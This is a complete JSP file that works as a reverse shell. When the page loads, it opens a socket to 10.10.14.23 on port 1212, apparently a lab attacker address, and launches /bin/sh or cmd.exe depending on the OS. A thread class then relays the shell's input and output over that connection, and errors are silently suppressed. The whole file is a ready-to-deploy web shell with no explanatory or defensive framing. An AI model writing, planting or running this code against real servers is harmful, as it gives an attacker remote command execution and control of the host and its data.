<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream nm;
    OutputStream rw;

    StreamConnector( InputStream nm, OutputStream rw )
    {
      this.nm = nm;
      this.rw = rw;
    }

    public void run()
    {
      BufferedReader zz  = null;
      BufferedWriter vzs = null;
      try
      {
        zz  = new BufferedReader( new InputStreamReader( this.nm ) );
        vzs = new BufferedWriter( new OutputStreamWriter( this.rw ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = zz.read( buffer, 0, buffer.length ) ) > 0 )
        {
          vzs.write( buffer, 0, length );
          vzs.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( zz != null )
          zz.close();
        if( vzs != null )
          vzs.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.23", 1212 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
